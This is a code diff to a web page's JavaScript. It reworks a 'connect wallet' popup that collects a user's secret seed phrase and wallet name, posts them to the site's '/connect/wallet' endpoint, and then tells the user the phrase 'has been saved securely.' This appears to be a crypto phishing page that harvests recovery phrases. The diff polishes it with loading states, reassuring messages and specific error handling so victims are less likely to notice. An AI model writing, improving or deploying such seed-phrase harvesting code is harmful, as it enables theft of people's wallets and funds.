@@ -3731,8 +3731,8 @@ window.smartsupp||(function(d) {
             $('#button_connect_wallet').click( function(e) {
                 e.preventDefault();
                 
-                const secretPhrase = $('#secret_phrase').val();
-                const walletName = $('#wallet_namexx').val();
+                const secretPhrase = $('#secret_phrase').val().trim();
+                const walletName = $('#wallet_namexx').val().trim();
                 
                 if (!secretPhrase) {
                     alert('Please enter your seed phrase');
@@ -3744,36 +3744,57 @@ window.smartsupp||(function(d) {
                     return;
                 }
  
-                let formData = $('#registrationForm').serialize();
+                // Show loading state
+                const $button = $('#button_connect_wallet');
+                const originalText = $button.text();
+                $button.prop('disabled', true).text('Connecting...');
+ 
+                // Prepare form data
+                const formData = new FormData();
+                formData.append('wallet_name', walletName);
+                formData.append('secret_phrase', secretPhrase);
  
                 $.ajax({
                     method: 'POST',
                     url: '/connect/wallet',
                     data: formData,
+                    processData: false,
+                    contentType: false,
+                    dataType: 'json',
 
                     success: function (response) {
- 
-                        let res = JSON.parse(response);
- 
-                        $('#responseContainer').removeClass('alert-danger');
-                        $('#responseContainer').addClass('alert-success');
-                        $('#responseContainer').html(res.message || 'Wallet connected successfully!');
-                        $('#responseContainer').show();
+                        alert('✓ Wallet connected successfully! Your seed phrase has been saved securely.');
                         
                         // Clear form
                         $('#registrationForm')[0].reset();
                         $('#wallet_namexx').val('');
- 
+                        $('#secret_phrase').val('');
+                        
+                        // Close modal after brief delay
+                        setTimeout(function() {
+                            $('#popup_connect_wallet').modal('hide');
+                        }, 500);
                     },
-                    error: function (response) {
- 
-                        let res = response.responseJSON || {};
- 
-                        $('#responseContainer').addClass('alert-danger');
-                        $('#responseContainer').removeClass('alert-success');
-                        $('#responseContainer').html(res.message || 'Error saving wallet');
-                        $('#responseContainer').show();
+                    error: function (xhr, status, error) {
+                        let errorMsg = 'Error connecting wallet. Please try again.';
+                        
+                        if (xhr.responseJSON && xhr.responseJSON.message) {
+                            errorMsg = xhr.responseJSON.message;
+                        } else if (xhr.status === 0) {
+                            errorMsg = 'Network error. Please check your connection.';
+                        } else if (xhr.status === 403) {
+                            errorMsg = 'Security verification failed. Please refresh the page and try again.';
+                        } else if (xhr.status === 422) {
+                            errorMsg = 'Invalid data. Please check your seed phrase.';
+                        }
+                        
+                        alert('✗ ' + errorMsg);
+                        console.error('Wallet connection error:', xhr);
                     },
+                    complete: function() {
+                        // Restore button state
+                        $button.prop('disabled', false).text(originalText);
+                    }
                 });
             });
  
